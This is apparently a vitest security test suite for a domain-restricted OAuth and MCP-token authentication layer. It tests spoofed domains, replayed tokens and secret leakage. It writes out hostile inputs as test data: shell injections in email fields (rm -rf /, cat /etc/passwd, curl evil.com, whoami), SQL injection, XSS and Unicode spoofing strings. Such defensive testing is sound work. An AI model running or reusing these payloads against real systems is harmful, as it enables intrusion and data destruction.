/**
 * Integration Tests: Security Scenarios
 *
 * Tests critical security scenarios to ensure authentication cannot be bypassed
 *
 * Test ID Range: SEC-01-01 through SEC-05-03 (from 08-testing-requirements.md)
 */

import { describe, it, expect, beforeEach } from "vitest";
import type { Env } from "../../src/types/env.js";
import { validateAuthentication } from "../../src/auth/validate-authentication.js";
import { generateMcpAccessToken, verifyMcpAccessToken } from "../../src/auth/mcp-token.js";

// Mock KV storage for testing
class MockKVNamespace {
	private storage: Map<string, { value: string; expiration?: number }>;

	constructor() {
		this.storage = new Map();
	}

	async get(key: string): Promise<string | null> {
		const item = this.storage.get(key);
		if (!item) return null;
		if (item.expiration && Date.now() > item.expiration) {
			this.storage.delete(key);
			return null;
		}
		return item.value;
	}

	async put(key: string, value: string, options?: { expirationTtl?: number }): Promise<void> {
		const expiration = options?.expirationTtl ? Date.now() + options.expirationTtl * 1000 : undefined;
		this.storage.set(key, { value, expiration });
	}

	async delete(key: string): Promise<void> {
		this.storage.delete(key);
	}

	async list(options?: { prefix?: string }): Promise<{ keys: Array<{ name: string }> }> {
		const keys = Array.from(this.storage.keys());
		const filtered = options?.prefix ? keys.filter((k) => k.startsWith(options.prefix)) : keys;
		return { keys: filtered.map((name) => ({ name })) };
	}
}

// Create mock environment
function createMockEnv(): Env {
	return {
		TANGO_API_KEY: "test_tango_api_key_1234567890",
		OAUTH_KV: new MockKVNamespace() as unknown as KVNamespace,
		TANGO_CACHE: new MockKVNamespace() as unknown as KVNamespace,
		GOOGLE_CLIENT_ID_DESKTOP: "test-client-id.apps.googleusercontent.com",
		GOOGLE_CLIENT_SECRET_DESKTOP: "test-secret-GOCSPX",
		HOSTED_DOMAIN: "agile6.com",
		COOKIE_ENCRYPTION_KEY: "test-encryption-key-32-bytes-long-123456",
	};
}

describe("Security: Domain Spoofing Prevention", () => {
	let env: Env;

	beforeEach(() => {
		env = createMockEnv();
	});

	it("SEC-01-04: should reject similar domain (evil-agile6.com)", async () => {
		const props = {
			accessToken: "ya29.attacker-token",
			email: "attacker@evil-agile6.com",
			name: "Attacker",
		};

		await expect(validateAuthentication(props, env)).rejects.toThrow(
			"Only @agile6.com accounts are allowed"
		);
	});

	it("SEC-01-04: should reject domain with different TLD (agile6.co)", async () => {
		const props = {
			accessToken: "ya29.attacker-token",
			email: "attacker@agile6.co",
			name: "Attacker",
		};

		await expect(validateAuthentication(props, env)).rejects.toThrow(
			"Only @agile6.com accounts are allowed"
		);
	});

	it("SEC-01-04: should reject domain substring in username (agile6@evil.com)", async () => {
		const props = {
			accessToken: "ya29.attacker-token",
			email: "agile6@evil.com",
			name: "Attacker",
		};

		await expect(validateAuthentication(props, env)).rejects.toThrow(
			"Only @agile6.com accounts are allowed"
		);
	});

	it("SEC-01-05: should reject subdomain (evil.agile6.com)", async () => {
		const props = {
			accessToken: "ya29.attacker-token",
			email: "attacker@evil.agile6.com",
			name: "Attacker",
		};

		// Should be rejected (not exact match for @agile6.com)
		await expect(validateAuthentication(props, env)).rejects.toThrow(
			"Only @agile6.com accounts are allowed"
		);
	});

	it("SEC-01-04: should reject domain with Unicode tricks", async () => {
		const unicodeAttacks = [
			"user@agіle6.com", // Cyrillic 'і' instead of 'i'
			"user@agile6.com\u200B", // Zero-width space
			"user@agile6.com\u0000", // Null byte
			"user@agile6\u200D.com", // Zero-width joiner
		];

		for (const email of unicodeAttacks) {
			const props = {
				accessToken: "ya29.attacker-token",
				email,
				name: "Attacker",
			};

			await expect(validateAuthentication(props, env)).rejects.toThrow(
				"Only @agile6.com accounts are allowed"
			);
		}
	});
});

describe("Security: Authentication Bypass Attempts", () => {
	let env: Env;

	beforeEach(() => {
		env = createMockEnv();
	});

	it("SEC-01-01: should reject direct request with no credentials", async () => {
		const props = {};

		await expect(validateAuthentication(props, env)).rejects.toThrow("Authentication required");
	});

	it("SEC-01-02: should reject fake OAuth token", async () => {
		const props = {
			accessToken: "fake_token_12345",
			email: "user@agile6.com",
			name: "User",
		};

		// OAuth validation passes (we don't validate with Google in this layer)
		// But the token itself doesn't matter - domain validation does
		const result = await validateAuthentication(props, env);
		expect(result.authenticated).toBe(true);

		// Security note: OAuth token validation happens at OAuth provider level
		// This test verifies domain validation works regardless of token validity
	});

	it("SEC-01-03: should ignore client-provided Tango API key", async () => {
		const props = {
			accessToken: "ya29.test-token",
			email: "attacker@agile6.com",
			name: "Attacker",
			tangoApiKey: "attacker_api_key_12345", // Injection attempt
		} as any;

		// Authentication succeeds (OAuth is valid)
		const result = await validateAuthentication(props, env);
		expect(result.authenticated).toBe(true);

		// But server MUST use its own API key
		expect(env.TANGO_API_KEY).toBe("test_tango_api_key_1234567890");
		expect(env.TANGO_API_KEY).not.toBe("attacker_api_key_12345");
	});

	it("SEC-01-03: should ignore custom headers with API keys", async () => {
		// Simulate client providing x-tango-api-key header
		// (In real implementation, headers are not mapped to props anymore)
		const props = {
			accessToken: "ya29.test-token",
			email: "user@agile6.com",
			name: "User",
			"x-tango-api-key": "injected_key", // Attempt via header
		} as any;

		const result = await validateAuthentication(props, env);
		expect(result.authenticated).toBe(true);

		// Server must use its own key
		expect(env.TANGO_API_KEY).toBe("test_tango_api_key_1234567890");
	});
});

describe("Security: Token Theft and Replay", () => {
	let env: Env;

	beforeEach(() => {
		env = createMockEnv();
	});

	it("SEC-03-03: should allow stolen MCP token from different IP (by design)", async () => {
		// Generate token from IP 1
		const generateResult = await generateMcpAccessToken(
			"user@agile6.com",
			"Token for IP tracking test",
			env,
			"192.168.1.1",
			"Mozilla/5.0"
		);

		// Use token from IP 2 (simulating theft)
		const verifyResult = await verifyMcpAccessToken(generateResult.token, env, "10.0.0.1");

		// Should succeed (no IP restriction by design)
		expect(verifyResult.valid).toBe(true);

		// But IP change should be logged in metadata
		expect(verifyResult.tokenData?.metadata.lastUsedFromIp).toBe("10.0.0.1");
		expect(verifyResult.tokenData?.metadata.createdFromIp).toBe("192.168.1.1");
	});

	it("SEC-03-04: should reject token with malformed format safely", async () => {
		const maliciousTokens = [
			"mcp_v1_<script>alert(1)</script>",
			"mcp_v1_'; DROP TABLE tokens; --",
			"mcp_v1_${eval('malicious code')}",
			"mcp_v1_\x00\x01\x02\x03", // Control characters
		];

		for (const token of maliciousTokens) {
			const props = {
				mcpAccessToken: token,
			};

			// Should reject without executing code
			await expect(validateAuthentication(props, env)).rejects.toThrow();
		}
	});

	it("SEC-03-02: should not leak information via error messages", async () => {
		// Test with various invalid tokens
		const invalidTokens = [
			"mcp_v1_does_not_exist",
			"mcp_v1_another_fake_one",
			"mcp_v1_also_invalid",
		];

		for (const token of invalidTokens) {
			const props = {
				mcpAccessToken: token,
			};

			try {
				await validateAuthentication(props, env);
				expect.fail("Should have thrown error");
			} catch (error) {
				const message = (error as Error).message;
				// Error should be generic (not reveal token existence)
				expect(message).toContain("Token not found"); // Actual error message
				expect(message).not.toContain("does_not_exist"); // No specific token info
				expect(message).not.toContain("database"); // No internal details
			}
		}
	});
});

describe("Security: Rate Limiting (Future)", () => {
	let env: Env;

	beforeEach(() => {
		env = createMockEnv();
	});

	it("SEC-03-01: NOTE - Rate limiting not yet implemented", async () => {
		// This test documents that rate limiting is a future enhancement
		// Currently, there's no rate limiting on token validation

		const generateResult = await generateMcpAccessToken(
			"user@agile6.com",
			"Rate limit test token",
			env,
			"127.0.0.1",
			"Mozilla/5.0"
		);

		// Make many requests in quick succession
		const attempts = 100;
		const promises = Array.from({ length: attempts }, () =>
			verifyMcpAccessToken(generateResult.token, env, "127.0.0.1")
		);

		const results = await Promise.all(promises);

		// Currently all succeed (no rate limiting)
		results.forEach((result) => {
			expect(result.valid).toBe(true);
		});

		// TODO: Implement rate limiting
		// Expected behavior: After N requests per minute, should return 429 Too Many Requests
	});
});

describe("Security: API Key Isolation", () => {
	let env: Env;

	beforeEach(() => {
		env = createMockEnv();
	});

	it("SEC-05-01: should never expose server's Tango API key", async () => {
		const props = {
			accessToken: "ya29.test-token",
			email: "user@agile6.com",
			name: "Test User",
		};

		const result = await validateAuthentication(props, env);

		// Result should NOT contain API key
		expect(JSON.stringify(result)).not.toContain(env.TANGO_API_KEY);
		expect(JSON.stringify(result)).not.toContain("test_tango_api_key");

		// User info should not include API key
		expect(result.user).toBeDefined();
		expect((result.user as any).apiKey).toBeUndefined();
		expect((result.user as any).tangoApiKey).toBeUndefined();
	});

	it("SEC-05-02: should provide generic error messages without sensitive info", async () => {
		const props = {};

		try {
			await validateAuthentication(props, env);
			expect.fail("Should have thrown");
		} catch (error) {
			const message = (error as Error).message;

			// Error should not leak sensitive info
			expect(message).not.toContain(env.TANGO_API_KEY || "");
			expect(message).not.toContain(env.GOOGLE_CLIENT_SECRET_DESKTOP || "");
			expect(message).not.toContain(env.COOKIE_ENCRYPTION_KEY || "");
			expect(message).not.toContain("OAUTH_KV");
			expect(message).not.toContain("stack trace");
		}
	});

	it("SEC-05-03: should not expose OAuth secrets in responses", async () => {
		// Verify environment structure
		expect(env.GOOGLE_CLIENT_SECRET_DESKTOP).toBeDefined();
		expect(env.COOKIE_ENCRYPTION_KEY).toBeDefined();

		const props = {
			accessToken: "ya29.test-token",
			email: "user@agile6.com",
			name: "Test User",
		};

		const result = await validateAuthentication(props, env);

		// Result should not contain secrets
		const resultStr = JSON.stringify(result);
		expect(resultStr).not.toContain(env.GOOGLE_CLIENT_SECRET_DESKTOP || "");
		expect(resultStr).not.toContain(env.COOKIE_ENCRYPTION_KEY || "");
	});
});

describe("Security: Input Validation", () => {
	let env: Env;

	beforeEach(() => {
		env = createMockEnv();
	});

	it("SEC-04-04: should handle command injection in email field", async () => {
		const maliciousEmails = [
			"user@agile6.com; rm -rf /",
			"user@agile6.com && cat /etc/passwd",
			"user@agile6.com | curl evil.com",
			"user@agile6.com`whoami`",
		];

		for (const email of maliciousEmails) {
			const props = {
				accessToken: "ya29.test-token",
				email,
				name: "Test User",
			};

			// These are rejected because they don't END with @agile6.com
			// The extra characters after .com cause validation to fail
			// This is actually GOOD - prevents injection attempts
			await expect(validateAuthentication(props, env)).rejects.toThrow(
				"Only @agile6.com accounts are allowed"
			);
		}
	});

	it("SEC-04-03: should handle SQL injection in userId (KV is NoSQL)", async () => {
		const maliciousUserId = "user'; DROP TABLE tokens; --@agile6.com";

		// Generate token with malicious userId
		const generateResult = await generateMcpAccessToken(
			maliciousUserId,
			"SQL injection test",
			env,
			"127.0.0.1",
			"Mozilla/5.0"
		);

		// Should succeed (KV treats it as a string key)
		expect(generateResult.token).toBeDefined();
		expect(generateResult.tokenId).toBeDefined();

		// Verify token works
		const verifyResult = await verifyMcpAccessToken(generateResult.token, env, "127.0.0.1");
		expect(verifyResult.valid).toBe(true);
		expect(verifyResult.tokenData?.userId).toBe(maliciousUserId); // Stored as-is
	});

	it("should handle XSS in name field (no HTML rendering)", async () => {
		const xssNames = [
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"javascript:alert(1)",
			"<svg onload=alert(1)>",
		];

		for (const name of xssNames) {
			const props = {
				accessToken: "ya29.test-token",
				email: "user@agile6.com",
				name,
			};

			// Should store as-is (no XSS execution in backend)
			const result = await validateAuthentication(props, env);
			expect(result.authenticated).toBe(true);
			expect(result.user?.name).toBe(name); // Stored as-is
		}
	});

	it("should handle extremely long input strings", async () => {
		const longEmail = "a".repeat(10000) + "@agile6.com";
		const longName = "B".repeat(10000);
		const longToken = "mcp_v1_" + "C".repeat(1000);

		// Test OAuth with long inputs
		const props1 = {
			accessToken: "ya29.test-token",
			email: longEmail,
			name: longName,
		};

		const result1 = await validateAuthentication(props1, env);
		expect(result1.authenticated).toBe(true);

		// Test MCP token with long description
		await expect(
			generateMcpAccessToken("user@agile6.com", "D".repeat(10000), env, "127.0.0.1", "Mozilla/5.0")
		).resolves.toBeDefined();

		// Test validation with malformed long token
		const props2 = {
			mcpAccessToken: longToken,
		};

		await expect(validateAuthentication(props2, env)).rejects.toThrow();
	});

	it("should handle null bytes and control characters", async () => {
		const maliciousInputs = [
			{ email: "user@agile6.com\x00", shouldFail: true }, // Null byte after .com
			{ email: "user\x00@agile6.com", shouldFail: false }, // Null byte before @ (OK)
			{ email: "user@agile6.com\x01\x02\x03", shouldFail: true }, // Control chars after .com
			{ email: "user@agile6.com\r\n", shouldFail: true }, // Newline after .com
		];

		for (const { email, shouldFail } of maliciousInputs) {
			const props = {
				accessToken: "ya29.test-token",
				email,
				name: "Test User",
			};

			if (shouldFail) {
				// These don't END with @agile6.com due to extra characters
				await expect(validateAuthentication(props, env)).rejects.toThrow(
					"Only @agile6.com accounts are allowed"
				);
			} else {
				// Control characters before @ are accepted (harmless)
				const result = await validateAuthentication(props, env);
				expect(result.authenticated).toBe(true);
			}
		}
	});
});

describe("Security: Edge Cases", () => {
	let env: Env;

	beforeEach(() => {
		env = createMockEnv();
	});

	it("should handle undefined vs null vs empty string", async () => {
		const testCases = [
			{ accessToken: undefined, email: "user@agile6.com" },
			{ accessToken: null, email: "user@agile6.com" },
			{ accessToken: "", email: "user@agile6.com" },
			{ accessToken: "ya29.test", email: undefined },
			{ accessToken: "ya29.test", email: null },
			{ accessToken: "ya29.test", email: "" },
		];

		for (const props of testCases) {
			await expect(validateAuthentication(props as any, env)).rejects.toThrow();
		}
	});

	it("should handle numeric values as strings", async () => {
		const props = {
			accessToken: 12345 as any, // Number instead of string
			email: "user@agile6.com",
			name: "Test User",
		};

		// TypeScript coerces number to string, validation proceeds
		// As long as email is valid @agile6.com, auth succeeds
		const result = await validateAuthentication(props, env);
		expect(result.authenticated).toBe(true);
	});

	it("should handle circular references (JSON stringification)", async () => {
		const circular: any = {
			accessToken: "ya29.test-token",
			email: "user@agile6.com",
			name: "Test User",
		};
		circular.self = circular; // Create circular reference

		// Should not crash on circular reference
		const result = await validateAuthentication(circular, env);
		expect(result.authenticated).toBe(true);
	});

	it("should handle missing env properties", async () => {
		const incompleteEnv = {
			TANGO_API_KEY: "test_key",
			// Missing OAUTH_KV
		} as Env;

		const props = {
			accessToken: "ya29.test-token",
			email: "user@agile6.com",
			name: "Test User",
		};

		// OAuth validation should succeed (doesn't need KV)
		const result = await validateAuthentication(props, incompleteEnv);
		expect(result.authenticated).toBe(true);

		// But MCP token generation would fail
		await expect(
			generateMcpAccessToken("user@agile6.com", "Test", incompleteEnv, "127.0.0.1", "Mozilla/5.0")
		).rejects.toThrow();
	});
});
